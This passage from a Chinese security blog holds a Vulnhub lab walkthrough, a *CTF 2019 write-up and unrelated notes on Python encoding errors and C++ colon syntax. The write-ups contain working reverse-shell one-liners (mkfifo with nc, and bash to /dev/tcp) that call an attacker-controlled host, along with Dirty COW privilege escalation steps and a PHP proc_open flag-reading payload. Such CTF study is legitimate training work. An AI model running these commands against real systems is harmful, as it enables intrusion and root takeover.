<p><img src="https://i.loli.net/2019/05/26/5cea550d1773e83513.png" alt=""></p>
<ul>
<li>不过这样的shell交互性不强且有点蛋疼，于是我们使用如下命令:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.199.238 2333&gt;/tmp/f</span><br></pre></td></tr></table></figure>
<ul>
<li>本地监听：<code>nc -lvvp 2333</code></li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea55984764889404.png" alt=""></p>
<ul>
<li><p>当前目录下就有一个<code>flag</code>，但我们目标是拿到<code>root</code>权限，于是我们先收集信息：<code>uname -a</code>：</p>
<blockquote>
<p>Linux leopold 3.5.0-17-generic #28-Ubuntu SMP Tue Oct 9 19:32:08 UTC 2012 i686 i686 i686 GNU/Linux</p>
</blockquote>
</li>
<li><p>看见这内核版本，我们就可以利用<code>dirtycow</code>（脏牛），脏牛：</p>
<blockquote>
<p>脏牛（Dirty Cow）是Linux内核的一个提权漏洞，攻击者可以利用这个漏洞获取root权限。之所以叫Dirty Cow，因为这个漏洞利用了Linux的copy-on-write机制。脏牛的CVE编号是CVE-2016-5195。<br>影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。<br>360 Vulpecker Team：Android 7.0最新的10月补丁安全级别的系统上测试过漏洞POC，确认Android受影响</p>
</blockquote>
</li>
<li><p><a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c" target="_blank" rel="noopener">poc地址</a></p>
</li>
<li><p>将其下载到本地的另一台主机上，然后再进行下载：</p>
</li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea5892dfd3177422.png" alt=""></p>
<ul>
<li>在<code>/tmp</code>目录下进行编译：<code>gcc -o dirtycow dirty.c -pthread -lcrypt</code></li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea5903a9b3080649.png" alt=""></p>
<ul>
<li>然后运行，等待一会，便成功创建了<code>firefart</code>账号</li>
</ul>
<p><img src="https://i.loli.net/2019/05/26/5cea596c2ed1661384.png" alt=""></p>
<ul>
<li>然后切换账户，便成功得到了<code>root</code>权限，在<code>/root</code>目录下即可获得flag</li>
</ul>
<p>reference：<br><a href="https://www.cnblogs.com/bmjoker/p/9538541.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9538541.html</a><br><a href="https://www.sevenlayers.com/index.php/182-vulnhub-sp-leopold-walkthrough" target="_blank" rel="noopener">https://www.sevenlayers.com/index.php/182-vulnhub-sp-leopold-walkthrough</a><br><a href="https://www.jianshu.com/p/1b545a8b8b1e" target="_blank" rel="noopener">https://www.jianshu.com/p/1b545a8b8b1e</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/靶机/">靶机</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/30/CTF/starctf2019/"><span>startctf2019</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/30/CTF/starctf2019/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-30T13:50:46.320Z">
          2019-04-30
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="starctf2019"><a href="#starctf2019" class="headerlink" title="starctf2019"></a>starctf2019</h1><h2 id="mywebsql"><a href="#mywebsql" class="headerlink" title="mywebsql"></a>mywebsql</h2><p><strong>admin admin</strong>弱口令登入，网上搜索，关于mywebsql的cve，找到了一个<a href="https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md" target="_blank" rel="noopener">rce</a>，按照他的步骤，生成一个shell，蚁剑连接，将同名目录下的<strong>readflag</strong>下载下来，实在没啥思路，之后参考了师傅的<a href="https://www.zhaoj.in/read-5479.html" target="_blank" rel="noopener">blog</a></p>
<p>运行<strong>readflag</strong>文件：/readflag,会出现：</p>
<blockquote>
<p>Solve the easy challenge first<br>(((((886366)-(-362092))+(188748))-(-638404))-(-286590))<br>input your answer: calculate error!</p>
</blockquote>
<p>然后闪退<br>在<strong>/backups</strong>目录下新建一个sh文件（本目录下权限最大），内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/Your IP/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>在自己的vps上监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure></p>
<p>成功反弹shell</p>
<p>用<strong>ida</strong>查看readflag文件，注意到<strong><a href="https://linux.die.net/man/3/ualarm" target="_blank" rel="noopener">ualarm</a></strong>函数，有如下描述：</p>
<blockquote>
<p>Description<br>The ualarm() function causes the signal SIGALRM to be sent to the invoking process after (not less than) usecs microseconds. The delay may be lengthened slightly by any system activity or by the time spent processing the call or by the granularity of system timers.</p>
<p>Unless caught or ignored, the SIGALRM signal will terminate the process.</p>
<p>If the interval argument is nonzero, further SIGALRM signals will be sent every interval microseconds after the first.</p>
</blockquote>
<p>注意这句话：<br><strong>Unless caught or ignored, the SIGALRM signal will terminate the process.</strong><br>所以我们试图去捕获sigalrm<br>找到一个参考：<a href="https://www.cnblogs.com/maxgongzuo/p/6372898.html" target="_blank" rel="noopener">https://www.cnblogs.com/maxgongzuo/p/6372898.html</a><br>利用：<code>trap &#39;&#39; 14</code></p>
<p>最后：</p>
<blockquote>
<p>Solve the easy challenge first<br>(((((-95329)-(-655048))+(-432249))+(476302))-(-374607))<br>input your answer: 978379<br>ok! here is your flag!!<br>*ctf{h4E9PKLkr6HTO3JcRglVdYaBSA0eDU8y}</p>
</blockquote>
<p>方法2：参考<a href="https://evoa.me/index.php/archives/51/" target="_blank" rel="noopener">writeup</a><br>新建一个exp.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // 标准输入，子进程从此管道中读取数据</span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // 标准输出，子进程向此管道中写入数据</span><br><span class="line">   2 =&gt; array(&quot;file&quot;, &quot;/tmp/error-output.txt&quot;, &quot;a&quot;) // 标准错误，写入到一个文件</span><br><span class="line">);</span><br><span class="line">$cwd = &apos;/tmp&apos;;</span><br><span class="line">$env = array(&apos;some_option&apos; =&gt; &apos;aeiou&apos;);</span><br><span class="line">$process = proc_open(&apos;/readflag&apos;, $descriptorspec, $pipes, $cwd, $env);</span><br><span class="line">if (is_resource($process)) &#123;</span><br><span class="line">    // $pipes 现在看起来是这样的：</span><br><span class="line">    // 0 =&gt; 可以向子进程标准输入写入的句柄</span><br><span class="line">    // 1 =&gt; 可以从子进程标准输出读取的句柄</span><br><span class="line">    // 错误输出将被追加到文件 /tmp/error-output.txt</span><br><span class="line">    //fwrite($pipes[0], &apos;&apos;);</span><br><span class="line">    //fclose($pipes[0]);</span><br><span class="line">        $output1 = fread($pipes[1],1024);</span><br><span class="line">        var_dump($output);</span><br><span class="line">        $output2 = fread($pipes[1],1024);</span><br><span class="line">        var_dump($output);</span><br><span class="line">        $output3 = fread($pipes[1],1024);</span><br><span class="line">        var_dump($output);</span><br><span class="line">    </span><br><span class="line">    $calc = trim($output2);</span><br><span class="line">    $an = eval(&quot;return $calc;&quot;);</span><br><span class="line">    var_dump($an);</span><br><span class="line">    fwrite($pipes[0], (string)$an.&quot;\n&quot;);</span><br><span class="line">    $output = stream_get_contents($pipes[1]);</span><br><span class="line">    var_dump($output);</span><br><span class="line">    // 切记：在调用 proc_close 之前关闭所有的管道以避免死锁。</span><br><span class="line">    $return_value = proc_close($process);</span><br><span class="line">    echo &quot;command returned $return_value\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>执行可得：</p>
<blockquote>
<p>PHP Notice:  Undefined variable: output in /var/www/html/backups/exp.php on line 18<br>NULL<br>PHP Notice:  Undefined variable: output in /var/www/html/backups/exp.php on line 20<br>NULL<br>PHP Notice:  Undefined variable: output in /var/www/html/backups/exp.php on line 22<br>NULL<br>int(-1669937)<br>string(63) “ok! here is your flag!!<br>*ctf{h4E9PKLkr6HTO3JcRglVdYaBSA0eDU8y}<br>“<br>command returned 0</p>
</blockquote>
<p>方法3（同二有些类似）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://targeturl/backups/123456.php?cmd=$d=array(0=%3Earray(%22pipe%22,%22r%22),1=%3Earray(%22pipe%22,%22w%22));$fp=proc_open(%22../../../../readflag%22,$d,$pipes);$a=fgets($pipes[1]);$x=fgets($pipes[1]);$ret=eval(%22return%20$x;%22);echo%20$ret.%22%3CBR%3E%22;$emm=fwrite($pipes[0],strval($ret));echo%20$emm.%22%3CBR%3E%22;fclose($pipes[0]);$c=fgets($pipes[1]);$e=fgets($pipes[1]);echo%20$c.%20$e.%22%3CBR%3E%22;fclose($pipes[1]);proc_close($fp);</span><br></pre></td></tr></table></figure></p>
<p><a href="https://php.net/manual/zh/function.proc-open.php" target="_blank" rel="noopener">proc_open函数</a></p>
<h2 id="she"><a href="#she" class="headerlink" title="she"></a>she</h2><p>一个游戏，下载<a href="http://www.rpgmakerweb.com/products/programs/rpg-maker-xp" target="_blank" rel="noopener">rpg maker xp</a><br>新建项目，然后将she下面的文件复制到项目中，然后再打开项目，就可以进行编辑</p>
<h2 id="echohub"><a href="#echohub" class="headerlink" title="echohub"></a>echohub</h2><p>查看源码，注意到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!--/?source=1--&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"> .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  </span><br><span class="line">| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. | </span><br><span class="line">| |  _________   | || |     ______   | || |  ____  ____  | || |     ____     | || |  ____  ____  | || | _____  _____ | || |   ______     | | </span><br><span class="line">| | |_   ___  |  | || |   .&apos; ___  |  | || | |_   ||   _| | || |   .&apos;    `.   | || | |_   ||   _| | || ||_   _||_   _|| || |  |_   _ \    | | </span><br><span class="line">| |   | |_  \_|  | || |  / .&apos;   \_|  | || |   | |__| |   | || |  /  .--.  \  | || |   | |__| |   | || |  | |    | |  | || |    | |_) |   | | </span><br><span class="line">| |   |  _|  _   | || |  | |         | || |   |  __  |   | || |  | |    | |  | || |   |  __  |   | || |  | &apos;    &apos; |  | || |    |  __&apos;.   | | </span><br><span class="line">| |  _| |___/ |  | || |  \ `.___.&apos;\  | || |  _| |  | |_  | || |  \  `--&apos;  /  | || |  _| |  | |_  | || |   \ `--&apos; /   | || |   _| |__) |  | | </span><br><span class="line">| | |_________|  | || |   `._____.&apos;  | || | |____||____| | || |   `.____.&apos;   | || | |____||____| | || |    `.__.&apos;    | || |  |_______/   | | </span><br><span class="line">| |              | || |              | || |              | || |              | || |              | || |              | || |              | | </span><br><span class="line">| &apos;--------------&apos; || &apos;--------------&apos; || &apos;--------------&apos; || &apos;--------------&apos; || &apos;--------------&apos; || &apos;--------------&apos; || &apos;--------------&apos; | </span><br><span class="line"> &apos;----------------&apos;  &apos;----------------&apos;  &apos;----------------&apos;  &apos;----------------&apos;  &apos;----------------&apos;  &apos;----------------&apos;  &apos;----------------&apos;  </span><br><span class="line"> </span><br><span class="line"> Welcome to random stack ! Try to execute `/readflag` :P</span><br><span class="line"> </span><br><span class="line"> &lt;/pre&gt;</span><br><span class="line"></span><br><span class="line"> &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;root &gt; &lt;input name=&quot;data&quot; placeholder=&quot;input some data&quot;&gt;&lt;/form&gt;O0OO0stack</span><br></pre></td></tr></table></figure></p>
<p>于是得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$banner = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;!--/?source=1--&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"> .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  </span><br><span class="line">| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. | </span><br><span class="line">| |  _________   | || |     ______   | || |  ____  ____  | || |     ____     | || |  ____  ____  | || | _____  _____ | || |   ______     | | </span><br><span class="line">| | |_   ___  |  | || |   .&apos; ___  |  | || | |_   ||   _| | || |   .&apos;    `.   | || | |_   ||   _| | || ||_   _||_   _|| || |  |_   _ \    | | </span><br><span class="line">| |   | |_  \_|  | || |  / .&apos;   \_|  | || |   | |__| |   | || |  /  .--.  \  | || |   | |__| |   | || |  | |    | |  | || |    | |_) |   | | </span><br><span class="line">| |   |  _|  _   | || |  | |         | || |   |  __  |   | || |  | |    | |  | || |   |  __  |   | || |  | &apos;    &apos; |  | || |    |  __&apos;.   | | </span><br><span class="line">| |  _| |___/ |  | || |  \ `.___.&apos;\  | || |  _| |  | |_  | || |  \  `--&apos;  /  | || |  _| |  | |_  | || |   \ `--&apos; /   | || |   _| |__) |  | | </span><br><span class="line">| | |_________|  | || |   `._____.&apos;  | || | |____||____| | || |   `.____.&apos;   | || | |____||____| | || |    `.__.&apos;    | || |  |_______/   | | </span><br><span class="line">| |              | || |              | || |              | || |              | || |              | || |              | || |              | | </span><br><span class="line">| &apos;--------------&apos; || &apos;--------------&apos; || &apos;--------------&apos; || &apos;--------------&apos; || &apos;--------------&apos; || &apos;--------------&apos; || &apos;--------------&apos; | </span><br><span class="line"> &apos;----------------&apos;  &apos;----------------&apos;  &apos;----------------&apos;  &apos;----------------&apos;  &apos;----------------&apos;  &apos;----------------&apos;  &apos;----------------&apos;  </span><br><span class="line"> </span><br><span class="line"> Welcome to random stack ! Try to execute `/readflag` :P</span><br><span class="line"> </span><br><span class="line"> &lt;/pre&gt;</span><br><span class="line"></span><br><span class="line"> &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;root &gt; &lt;input name=&quot;data&quot; placeholder=&quot;input some data&quot;&gt;&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">echo $banner;</span><br><span class="line">if(isset($_GET[&apos;source&apos;]))&#123;</span><br><span class="line">    $file = fopen(&quot;index.php&quot;,&quot;r&quot;);</span><br><span class="line">    $contents = fread($file,filesize(&quot;index.php&quot;));</span><br><span class="line">    echo &quot;---------------sourcecode---------------&quot;;</span><br><span class="line">    echo base64_encode($contents);</span><br><span class="line">    echo &quot;----------------------------------------&quot;;</span><br><span class="line">    fclose($file);</span><br><span class="line">    //Dockerfile here</span><br><span class="line">    echo &quot;RlJPTSB1YnVudHU6MTguMDQKClJVTiBzZWQgLWkgInMvaHR0cDpcL1wvYXJjaGl2ZS51YnVudHUuY29tL2h0dHA6XC9cL21pcnJvcnMudXN0Yy5lZHUuY24vZyIgL2V0Yy9hcHQvc291cmNlcy5saXN0ClJVTiBhcHQtZ2V0IHVwZGF0ZQpSVU4gYXB0LWdldCAteSBpbnN0YWxsIHNvZnR3YXJlLXByb3BlcnRpZXMtY29tbW9uClJVTiBhZGQtYXB0LXJlcG9zaXRvcnkgLXkgcHBhOm9uZHJlai9waHAKUlVOIGFwdC1nZXQgdXBkYXRlClJVTiBhcHQtZ2V0IC15IHVwZ3JhZGUKUlVOIGFwdC1nZXQgLXkgaW5zdGFsbCB0emRhdGEKUlVOIGFwdC1nZXQgLXkgaW5zdGFsbCB2aW0KUlVOIGFwdC1nZXQgLXkgaW5zdGFsbCBhcGFjaGUyClJVTiBhcHQtY2FjaGUgc2VhcmNoICJwaHAiIHwgZ3JlcCAicGhwNy4zInwgYXdrICd7cHJpbnQgJDF9J3wgeGFyZ3MgYXB0LWdldCAteSBpbnN0YWxsClJVTiBzZXJ2aWNlIC0tc3RhdHVzLWFsbCB8IGF3ayAne3ByaW50ICQ0fSd8IHhhcmdzIC1pIHNlcnZpY2Uge30gc3RvcAoKUlVOIHJtIC92YXIvd3d3L2h0bWwvaW5kZXguaHRtbApDT1BZIHJhbmRvbXN0YWNrLnBocCAvdmFyL3d3dy9odG1sL2luZGV4LnBocApDT1BZIHNhbmRib3gucGhwIC92YXIvd3d3L2h0bWwvc2FuZGJveC5waHAKUlVOIGNobW9kIDc1NSAtUiAvdmFyL3d3dy9odG1sLwpDT1BZIGZsYWcgL2ZsYWcKQ09QWSByZWFkZmxhZyAvcmVhZGZsYWcKUlVOIGNobW9kIDU1NSAvcmVhZGZsYWcKUlVOIGNobW9kIHUrcyAvcmVhZGZsYWcKUlVOIGNobW9kIDUwMCAvZmxhZwpDT1BZIC4vcnVuLnNoIC9ydW4uc2gKQ09QWSAuL3BocC5pbmkgL2V0Yy9waHAvNy4zL2FwYWNoZTIvcGhwLmluaQpSVU4gY2htb2QgNzAwIC9ydW4uc2gKCkNNRCBbIi9ydW4uc2giXQ==&quot;; </span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$disable_functions = ini_get(&quot;disable_functions&quot;);</span><br><span class="line">$loadext = get_loaded_extensions();</span><br><span class="line">foreach ($loadext as $ext) &#123;</span><br><span class="line">    if(in_array($ext,array(&quot;Core&quot;,&quot;date&quot;,&quot;libxml&quot;,&quot;pcre&quot;,&quot;zlib&quot;,&quot;filter&quot;,&quot;hash&quot;,&quot;sqlite3&quot;,&quot;zip&quot;))) continue;</span><br><span class="line">    else &#123;</span><br><span class="line">        if(count(get_extension_funcs($ext)?get_extension_funcs($ext):array()) &gt;= 1)</span><br><span class="line">            $dfunc = join(&apos;,&apos;,get_extension_funcs($ext));</span><br><span class="line">        else</span><br><span class="line">            continue;</span><br><span class="line">        $disable_functions = $disable_functions.$dfunc.&quot;,&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = get_defined_functions()[&quot;internal&quot;];</span><br><span class="line">foreach ($func as $f)&#123;</span><br><span class="line">    if(stripos($f,&quot;file&quot;) !== false || stripos($f,&quot;open&quot;) !== false || stripos($f,&quot;read&quot;) !== false || stripos($f,&quot;write&quot;) !== false)&#123;</span><br><span class="line">        $disable_functions = $disable_functions.$f.&quot;,&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;disable_functions&quot;, $disable_functions);</span><br><span class="line">ini_set(&quot;open_basedir&quot;,&quot;/var/www/html/:/tmp/&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]).&quot;/&quot;);</span><br></pre></td></tr></table></figure></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/ctf/">ctf</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/29/python/python常见问题/"><span>python常见问题</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/29/python/python常见问题/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-29T02:40:27.705Z">
          2019-04-29
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="python常见问题"><a href="#python常见问题" class="headerlink" title="python常见问题"></a>python常见问题</h1><h2 id="Python2和3中-‘ascii’-codec-can’t-decode-byte-0xe4-in-position-0-ordinal-not-in-range-128"><a href="#Python2和3中-‘ascii’-codec-can’t-decode-byte-0xe4-in-position-0-ordinal-not-in-range-128" class="headerlink" title="Python2和3中 ‘ascii’ codec can’t decode byte 0xe4 in position 0: ordinal not in range(128)"></a>Python2和3中 ‘ascii’ codec can’t decode byte 0xe4 in position 0: ordinal not in range(128)</h2><p>python2<br>Python在进行编码方式之间的转换时，会将 unicode 作为“中间编码”，但 unicode 最大只有128那么长，所以这里当尝试将 ascii 编码字符串转换成”中间编码” unicode 时由于超出了其范围，就报出了如上错误。将Python的默认编码方式修改为utf-8即可，在py文件开头加入以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">reload(sys) </span><br><span class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</span><br></pre></td></tr></table></figure></p>
<p>python3<br>在python3中，sys.setdefaultencoding(‘utf-8’)已被禁用，将导入文件代码加上encoding=’bytes’则可解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = pickle.load(open(&quot;./data/coco/word2vec.p&quot;,&quot;rb&quot;), encoding=&apos;bytes&apos;)</span><br></pre></td></tr></table></figure></p>
<h2 id="No-module-named-Crypto-Cipher"><a href="#No-module-named-Crypto-Cipher" class="headerlink" title="No module named Crypto.Cipher"></a>No module named Crypto.Cipher</h2><p>环境：python2<br>解决办法：找到<code>../Lib/site-package</code>下的crypto包，将其改为<strong>Crypto</strong><br>参考：<a href="https://www.cnblogs.com/fawaikuangtu123/p/9761943.html" target="_blank" rel="noopener">https://www.cnblogs.com/fawaikuangtu123/p/9761943.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/error/">error</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/27/cpp/单双冒号区别/"><span>c++中冒号（:）和双冒号（::）的用法</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/27/cpp/单双冒号区别/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-27T09:30:04.804Z">
          2019-04-27
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="c-中冒号（-）和双冒号（-）的用法"><a href="#c-中冒号（-）和双冒号（-）的用法" class="headerlink" title="c++中冒号（:）和双冒号（::）的用法"></a>c++中冒号（:）和双冒号（::）的用法</h1><p>1.冒号（:）用法</p>
<p>（1）表示机构内位域的定义（即该变量占几个bit空间）</p>
<p>typedef struct _XXX{</p>
<p>unsigned char a:4;</p>
<p>unsigned char c;</p>
<p>} ; XXX</p>
<p>（2）构造函数后面的冒号起分割作用，是类给成员变量赋值的方法，初始化列表，更适用于成员变量的常量const型。</p>
<p>struct _XXX{</p>
<p>_XXX() : y(0xc0) {}</p>
<p>};</p>
<p>（3） public:和private:后面的冒号，表示后面定义的所有成员都是公有或私有的，直到下一个”public:”或”private:”出现为止。”private:”为默认处理。</p>
<p>（4）类名冒号后面的是用来定义类的继承。</p>
<p>class 派生类名 : 继承方式 基类名</p>
<p>{</p>
<p>派生类的成员</p>
<p>};</p>
<p>继承方式：public、private和protected，默认处理是public。</p>
<p>2．双冒号（::）用法</p>
<p>（1）表示“域操作符”<br>例：声明了一个类A，类A里声明了一个成员函数void f()，但没有在类的声明里给出f的定义，那么在类外定义f时，<br>就要写成void A::f()，表示这个f()函数是类A的成员函数。</p>
<p>（2）直接用在全局函数前，表示是全局函数<br>例：在VC里，你可以在调用API 函数里，在API函数名前加：：</p>
<p>（3）表示引用成员函数及变量，作用域成员运算符</p>
<p>例：System::Math::Sqrt() 相当于System.Math.Sqrt()<br>——————————————————————————————————————</p>
<p>VC中如下</p>
<p>::是C++里的“作用域分解运算符”。比如声明了一个类A，类A里声明了一个成员函数voidf()，但没有在类的声明里给出f的定义，那么在类外定义f时，就要写成voidA::f()，表示这个f()函数是类A的成员函数。<br>　　:: 一般还有一种用法，就是直接用在全局函数前，表示是全局函数。当类的成员函数跟类外的一个全局函数同名时，考试,大提示在类内定义的时候，打此函数名默认调用的是本身的成员函数；如果要调用同名的全局函数时，就必须打上::以示区别。比如在VC里，你可以在调用API函数时，在API函数名前加::。（编辑：）</p>
<hr>
<hr>
<hr>
<p>这篇文章将总结C/C++中的冒号的用法。</p>
<p>1、位域定义<br>这个在前面关于位结构体的文章里说得够多的了，不再重复了。</p>
<p>2、类构造函数(Constructor）的初始化列表<br>先说下什么叫构造函数吧（是不是啰嗦了？C++的人应该都知道了吧，还是以防万一一下）。所谓构造函数，就是与类同名的函数，它与普通函数的区别在于，它没有返回类型。<br>在构造函数后面紧跟着冒号加初始化列表，各初始化变量之间以逗号(,)隔开。下面举个例子。<br>class myClass<br>{<br>public :<br>myClass();// 构造函数，无返回类型，可以有参数列表，这里省去<br>~myClass();// 析构函数<br>int a;<br>const int b;<br>}</p>
<p>myClass::myClass():a(1),b(1)// 初始化列表<br>{<br>}<br>上面的例子展示了冒号的这个用法，下面对这个用法进行几点说明：<br>1)初始化列表的作用相当于在构造函数内进行相应成员变量的赋值，但两者是有差别的。<br>在初始化列表中是对变量进行初始化，而在构造函数内是进行赋值操作。两都的差别在对于像const类型数据的操作上表现得尤为明显。我们知道，const类型的变量必须在定义时进行初始化，而不能对const型的变量进行赋值，因此const类型的成员变量只能（而且必须）在初始化列表中进行初始化，即下面的代码将会出错：<br>myClass::myClass（）<br>{<br>a = 1;// 没错，效果相当于在初始化列表中进行初始化<br>b = 1;// 出错，const变量不能进行赋值操作；<br>}<br>2）初始化的顺序与成员变量声名的顺序相同。<br>先看一下下面的程序：<br>myClass::myClass():b(1),a(b)<br>{<br>}<br>这样的执行结果a,b各是多少呢？b=1,a=1?不是，b=1而a是个随机数。这一点是相当重要的哦，一般在初始化列表中进行初始化时，初始化的顺序应与声明的顺序保持一致，防止出现不必要的错误。<br>3）对于继承的类来说，在初始化列表中也可以进行基类的初始化，初始化的顺序是先基类初始化，然后再根据该类自己的变量的声明顺序进行初始化。</p>
<p>3、声明基类。<br>假设我们重新定义一个类，继承自myClass类。定义方式如下：<br>class derivedClass : public myClass<br>{<br>// 略去<br>}<br>这里的冒号起到的就是声名基类的作用，在基类类名前面可以加public/private/protected等标签，用于标识继承的类型，也可以省略，省略的话，用class定义的类默认为private，用struct定义的类默认为public，至于具体各个标签有什么区别这里就不说了。<br>与初始化列表一样的，这里也可以声名多个基类，各基类之间用逗号(,)隔开。</p>
